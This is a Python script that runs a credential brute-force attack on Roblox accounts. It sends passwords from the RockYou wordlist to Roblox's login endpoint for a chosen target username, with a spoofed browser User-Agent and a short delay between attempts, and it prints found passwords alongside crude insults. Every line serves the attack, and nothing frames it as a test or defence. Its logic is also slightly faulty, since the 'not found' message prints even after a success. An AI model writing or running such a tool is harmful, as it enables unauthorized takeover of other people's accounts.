import requests
import time
from tqdm import tqdm

username = "TargetUsername" 
wordlist_path = "RockYou.txt"

def read_wordlist(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def attempt_login(password):
    url = "https://auth.roblox.com/v2/login"
    payload = {
        "username": username,
        "password": password
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        response.raise_for_status()  # Raise an HTTPError for bad responses
        if response.status_code == 200:
            print(f"Password found: {password}, you little shit.")
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}, you dumbass.")
        return False

wordlist = read_wordlist(wordlist_path)

for password in tqdm(wordlist, desc="Attempting passwords"):
    if attempt_login(password):
        break
    time.sleep(.5)

print("Password not found, you dumbass.")
